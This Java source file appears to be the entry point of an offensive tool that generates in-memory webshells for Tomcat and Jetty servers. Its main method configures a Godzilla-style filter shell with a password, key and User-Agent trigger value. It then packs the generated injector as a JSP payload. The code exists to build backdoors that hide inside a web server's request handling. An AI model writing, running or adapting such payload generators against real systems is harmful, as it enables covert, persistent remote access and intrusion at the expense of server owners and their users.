package com.reajason.javaweb;

import com.reajason.javaweb.config.*;
import com.reajason.javaweb.memsell.jetty.JettyShell;
import com.reajason.javaweb.memsell.packer.Packer;
import com.reajason.javaweb.memsell.tomcat.TomcatShell;
import lombok.SneakyThrows;

import java.io.IOException;

/**
 * @author ReaJason
 * @since 2024/11/24
 */
public class GeneratorMain {
    static TomcatShell tomcatShell = new TomcatShell();
    static JettyShell jettyShell = new JettyShell();

    public static void main(String[] args) throws IOException {
        ShellConfig shellConfig = ShellConfig.builder()
                .server(Server.JETTY)
                .shellTool(ShellTool.Godzilla)
                .shellType(Constants.FILTER).build();
        GodzillaConfig godzillaConfig = GodzillaConfig.builder()
                .pass("pass")
                .key("key")
                .headerName("User-Agent")
                .headerValue("test123")
                .build();
        InjectorConfig injectorConfig = new InjectorConfig();
        byte[] bytes = generate(shellConfig, injectorConfig, godzillaConfig, Packer.INSTANCE.JSP);
        if (bytes != null) {
            System.out.println(new String(bytes));
        }
    }

    public static GenerateResult generate(ShellConfig shellConfig, InjectorConfig injectorConfig, ShellToolConfig shellToolConfig) {
        switch (shellConfig.getServer()) {
            case TOMCAT:
                return tomcatShell.generate(shellConfig, injectorConfig, shellToolConfig);
            case JETTY:
                return jettyShell.generate(shellConfig, injectorConfig, shellToolConfig);
            case BES:
                break;
            case RESIN:
                break;
            default:
                throw new IllegalArgumentException("Unsupported server");
        }
        return null;
    }

    @SneakyThrows
    public static byte[] generate(ShellConfig shellConfig, InjectorConfig injectorConfig, ShellToolConfig shellToolConfig, Packer.INSTANCE packerInstance) {
        GenerateResult generateResult = generate(shellConfig, injectorConfig, shellToolConfig);
        if (generateResult != null) {
//            Files.write(Paths.get( injectorConfig.getInjectorClassName() + ".class"), generateResult.getInjectorBytes(), StandardOpenOption.CREATE_NEW);
            return packerInstance.getPacker().pack(generateResult);
        }
        return null;
    }
}